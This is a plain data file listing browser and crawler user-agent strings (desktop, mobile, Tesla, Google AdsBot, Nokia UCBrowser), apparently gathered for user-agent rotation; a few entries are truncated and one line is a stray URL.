"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.3"
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.3"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128."
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/26.0 Chrome/122.0.0.0 Mobile Safari/537.3"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604."
"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604."
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.3"
"Mozilla/5.0 (Linux; Android 10; MED-LX9N; HMSCore 6.14.0.301) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.5.302 Mobile Safari/537.3"
"Mozilla/5.0 (Linux; Android 11; moto e20 Build/RONS31.267-94-14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.146 Mobile Safari/537.3"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.46 Mobile/15E148 Safari/604."
"Mozilla/5.0 (Android 13; Mobile; rv:130.0) Gecko/130.0 Firefox/130."
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604."
"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.46 Mobile/15E148 Safari/604."
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604."
"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/334.0.674067880 Mobile/15E148 Safari/604."
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/334.0.674067880 Mobile/15E148 Safari/604."
"Mozilla/5.0 (Linux; Android 9; SM-A750FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.3"
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/117.0.0.0 Mobile Safari/537.3"
"Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Mobile Safari/537.3"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/128.0.2739.90"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edge/44.18363.8131"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 OPR/113.0.0.0"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 OPR/113.0.0.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:128.0) Gecko/20100101 Firefox/128.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/128.0.2739.90"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 OPR/113.0.0.0"
"Mozilla/5.0 (X11; Linux i686; rv:130.0) Gecko/20100101 Firefox/130.0"
"Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:130.0) Gecko/20100101 Firefox/130.0"
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
"Mozilla/5.0 (X11; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0"
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0"
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 OPR/113.0.0.0"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.46 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 EdgiOS/128.2739.82 Mobile/15E148 Safari/605.1.15"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/130.0 Mobile/15E148 Safari/605.1.15"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (iPod; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.46 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (iPod touch; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) FxiOS/130.0 Mobile/15E148 Safari/605.1.15"
"Mozilla/5.0 (iPod touch; CPU iPhone 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (iPad; CPU OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/130.0 Mobile/15E148 Safari/605.1.15"
"Mozilla/5.0 (iPad; CPU OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.54 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.54 Mobile Safari/537.36 EdgA/128.0.2739.82"
"Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.54 Mobile Safari/537.36 EdgA/128.0.2739.82"
"Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.54 Mobile Safari/537.36 EdgA/128.0.2739.82"
"Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.54 Mobile Safari/537.36 EdgA/128.0.2739.82"
"Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36 Edge/40.15254.603"
"Mozilla/5.0 (Android 15; Mobile; rv:130.0) Gecko/130.0 Firefox/130.0"
"Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.54 Mobile Safari/537.36 OPR/76.2.4027.73374"
"Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.54 Mobile Safari/537.36 OPR/76.2.4027.73374"
"Mozilla/5.0 (Linux; Android 14; 2312DRA50G Build/UKQ1.231003.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.146 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.54 Mobile Safari/537.36 OPR/76.2.4027.73374"
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H143 Safari/600.1.4"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/79.0.3945.130 Chrome/79.0.3945.130 Safari/537.36 Tesla/2020.32.5-41d94f79b976"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/79.0.3945.130 Chrome/79.0.3945.130 Safari/537.36 Tesla/2020.32.2-108daa2c1277"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/79.0.3945.130 Chrome/79.0.3945.130 Safari/537.36 Tesla/2020.36.11-ccacdb181f16"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/75.0.3770.100 Chrome/75.0.3770.100 Safari/537.36 Tesla/2019.36.2.2-186de86"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/75.0.3770.100 Chrome/75.0.3770.100 Safari/537.36 Tesla/2019.36.2.4-fc422c3"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/79.0.3945.130 Chrome/79.0.3945.130 Safari/537.36 Tesla/2020.40.8-9744d0c0d399"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/75.0.3770.100 Chrome/75.0.3770.100 Safari/537.36 Tesla/2019.40.2-36f8355b356a"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/75.0.3770.100 Chrome/75.0.3770.100 Safari/537.36 Tesla/2019.40.50.5-79b51bc76a61"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 [ip:78.211.152.230]"
"Mozilla/5.0 (Linux; Android 4.4.2; SM-C101 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.72 Mobile Safari/537.36 OPR/16.0.1212.65583"
"Mozilla/5.0 (Linux; Android 12; SM-A137F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.146 Mobile Safari/537.36 Instagram 350.1.0.46.93 Android (31/12; 450dpi; 1080x2208; samsung; SM-A137F; a13ve; mt6768; it_IT; 645441432)"
"Mozilla/5.0 (Linux; Android 10; LM-X525 Build/QKQ1.200531.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/129.0.6668.70 Mobile Safari/537.36 Instagram 350.1.0.46.93 Android (29/10; 280dpi; 720x1382; LGE/lge; LM-X525; mmh4p; mmh4p; pt_BR; 645441619)"
"Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)"
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.224 Mobile Safari/537.36 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
"Mozilla/5.0 (Linux; Android 4.4.2; SM-C101 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.141 Mobile Safari/537.36 OPR/45.1.2246.125351"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7 (via ggpht.com)"
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.92 Mobile Safari/537.36 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.179 Mobile Safari/537.36 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.177 Mobile Safari/537.36 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.96 Mobile Safari/537.36 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML%2C like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.179 Mobile Safari/537.36 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html) [ip:45.125.216.44]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html), XFF:72.14.199.154"
"Mozilla/5.0 (Linux; Android 5.0; SM-G920A) AppleWebKit (KHTML,\x5CxC2\x5CxA0like Gecko) Chrome Mobile Safari (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html) [ip:66.143.216.33]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html) [ip:72.14.199.122]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html), XFF:72.14.199.158"
"Mozilla/5.0 (Linux; Android 5.0; SM-G920A) AppleWebKit (KHTML,\xC2\xA0like Gecko) Chrome Mobile Safari (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html) [ip:66.249.92.128]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html) [ip:66.249.92.130]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html) [ip:66.249.87.156]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html) [ip:66.249.87.152]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html) [ip:66.249.89.90]"
"Mozilla/5.0 (Web0S 100.0; Linux/SmartTV) (compatible; Google Desktop/6.0; http://desktop.google.com/)"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html) [ip:74.125.216.46]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html) [ip:74.125.216.48]"
"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15063"
"Mozilla/5.0 (compatible; Google Desktop/5.9.1005.12335; http://desktop.google.com/)"
"Mozilla/5.0 (compatible; Google Desktop/5.9.909.2235; http://desktop.google.com/)"
"https://user-agents.net/string/mozilla-5-0-compatible-google-desktop-5-9-911-3589-http-desktop-google-com"
"Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586"
"Mozilla/5.0 (Windows Phone 10.0; Android 7.0.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Mobile Safari/537.36 Edge/16.16299"
"Mozilla/5.0 (Windows Phone 10.0; Android 10; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 Edge/16.16299"
"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edge/14.14393"
"NokiaC1-01/2.0 (05.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; NokiaC1-01) U2/1.0.0 UCBrowser/9.5.0.449 U2/1.0.0 Mobile UNTRUSTED/1.0"
"NokiaC3-00/5.0 (04.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Windows; U; Windows NT 6.0; vi; Desktop) AppleWebKit/534.13 (KHTML, like Gecko) UCBrowser/9.4.1.377 UNTRUSTED/1.0"
"NokiaC1-01/2.0 (06.15) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; nokiac1-01) U2/1.0.0 UCBrowser/8.9.0.251 U2/1.0.0 Mobile UNTRUSTED/1.0"
"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Mobile Safari/537.36 Edge/16.16299"
"Nokia2690/2.0 (10.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokia2690) UCBrowser8.3.0.154/69/444/UCWEB Mobile UNTRUSTED/1.0"
"Nokia311/5.0 (07.36) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Windows; U; Windows NT 6.0; es-LA; Desktop) AppleWebKit/534.13 (KHTML, like Gecko) UCBrowser/9.5.0.449"
"Nokia5130c-2/2.0 (07.97) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; Nokia5130c-2) U2/1.0.0 UCBrowser/9.5.0.449 U2/1.0.0 Mobile UNTRUSTED/1.0"
"NokiaC2-01/5.0 (11.40) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; ar; nokiac2-01) U2/1.0.0 UCBrowser/8.9.0.251 U2/1.0.0 Mobile UNTRUSTED/1.0"
"NokiaC2-01/5.0 (11.40) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiac2-01) UCBrowser8.4.0.159/70/352/UCWEB Mobile UNTRUSTED/1.0"
"NokiaC2-01/5.0 (11.40) Profile/MIDP-2.1 Configuration/CLDC-1.1 http://www.google.com/bot.html; AppleWebKit/528.18(KHTML,like Gecko) Version/4.0 Mobile/7A341 Safari/528.16/UCWEB8.0.3.99/70/350 UNTRUSTED/1.0"
"Nokia305/2.0 (03.60) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; nokia305) U2/1.0.0 UCBrowser/8.9.0.251 U2/1.0.0 Mobile UNTRUSTED/1.0"
"Nokia110/2.0+(03.33)+Profile/MIDP-2.1+Configuration/CLDC-1.1+UCWEB/2.0+(Java;+U;+MIDP-2.0;+en-US;+Nokia110)+U2/1.0.0+UCBrowser/9.5.0.449+U2/1.0.0+Mobile+UNTRUSTED/1.0"
"Nokia206/2.0 (04.52) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2;.NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2)/UC Browser8.0.3.107/69/444 UNTRUSTED/1.0"
"Nokia6303iclassic/5.0 (09.83) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; Nokia6303iclassic) U2/1.0.0 UCBrowser/9.5.0.449 U2/1.0.0 Mobile UNTRUSTED/1.0"
"Nokia3120classic/2.0 (10.00) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; Nokia3120classic) U2/1.0.0 UCBrowser/9.5.0.449 U2/1.0.0 Mobile UNTRUSTED/1.0"
"NokiaC2-01/5.0 (11.40) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2;.NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2) UNTRUSTED/1.0"
"Nokia210/2.0 (06.09) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokia210) UCBrowser8.4.0.159/69/444/UCWEB Mobile UNTRUSTED/1.0"
"Nokia6111/2.0 (03.70) Profile/MIDP-2.0 Configuration/CLDC-1.1 Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2;.NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2) UCBrowser8.4.0.159/69/444, Nokia6111/2.0 (03.70) Profile/MIDP-2.0 Configuration/CLDC-1.1 UNTRUSTED/1.0"
"Nokia210.3/2.0 (04.12) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; nokia210.3) U2/1.0.0 UCBrowser/8.9.0.251 U2/1.0.0 Mobile UNTRUSTED/1.0"
"Nokia5130/2.0 (07.95) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; ru; Nokia5130) U2/1.0.0 UCBrowser/9.5.0.449 U2/1.0.0 Mobile UNTRUSTED/1.0"
"NokiaX2-01/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; NokiaX2-01) U2/1.0.0 UCBrowser/9.5.0.449 U2/1.0.0 Mobile UNTRUSTED/1.0"
"Nokia311/5.0 (05.92) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Windows; U; Windows NT 6.0; ar-SA; Desktop) AppleWebKit/534.13 (KHTML, like Gecko) UCBrowser/9.4.1.377 UNTRUSTED/1.0"
"Nokia6303iclassic/5.0 (10.80) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; Nokia6303iclassic) U2/1.0.0 UCBrowser/9.5.0.449 U2/1.0.0 Mobile UNTRUSTED/1.0"
"Nokia2020/2.0 (20.52) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; nokia2020) U2/1.0.0 UCBrowser/8.9.0.251 U2/1.0.0 Mobile UNTRUSTED/1.0"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36 Mozilla/5.0 (Linux; GoogleTV 3.2; NSZ-GS7/GX70 Build/MASTER) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.77 Safari/534.24"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Safari/537.36 Edg/102.0.1245.44 Mozilla/5.0 (Linux; GoogleTV 3.2; NSZ-GS7/GX70 Build/MASTER) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.77 Safari/534.24"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Mozilla/5.0 (Linux; GoogleTV 3.2; NSZ-GS7/GX70 Build/MASTER) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.77 Safari/534.24"
"Nokia113/2.0 (03.47) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokia113) UCBrowser8.3.0.154/69/352/UCWEB Mobile UNTRUSTED/1.0"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Mozilla/5.0 (Linux; GoogleTV 3.2; NSZ-GS7/GX70 Build/MASTER) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.77 Safari/534.24"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Mozilla/5.0 (Linux; GoogleTV 3.2; NSZ-GS7/GX70 Build/MASTER) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.77 Safari/534.24"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; GoogleTV 3.2; NSZ-GS7/GX70 Build/MASTER) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.77 Safari/534.24"
